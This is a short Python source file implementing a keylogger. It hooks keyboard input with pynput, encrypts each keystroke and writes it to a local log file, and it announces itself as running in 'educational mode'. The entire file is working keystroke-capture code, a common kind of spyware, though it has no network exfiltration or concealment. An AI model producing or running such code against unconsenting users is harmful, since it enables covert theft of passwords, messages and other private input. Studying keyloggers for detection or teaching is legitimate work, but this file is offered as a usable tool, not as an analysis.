from pynput import keyboard
import logging
import time
from datetime import datetime
from utils.encryption import DataEncryptor

class Keylogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.encryptor = DataEncryptor()
        self.setup_logging()
        
    def setup_logging(self):
        logging.basicConfig(
            filename=self.log_file,
            level=logging.DEBUG,
            format='%(asctime)s - %(message)s'
        )
        
    def on_press(self, key):
        try:
            logged_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                logged_key = " "
            else:
                logged_key = f"[{key.name}]"
                
        self.save_keystroke(logged_key)
        
    def save_keystroke(self, key_data):
        encrypted = self.encryptor.encrypt(key_data)
        logging.info(encrypted.decode('utf-8'))
        
    def run(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            print("Keylogger running in educational mode...")
            listener.join()
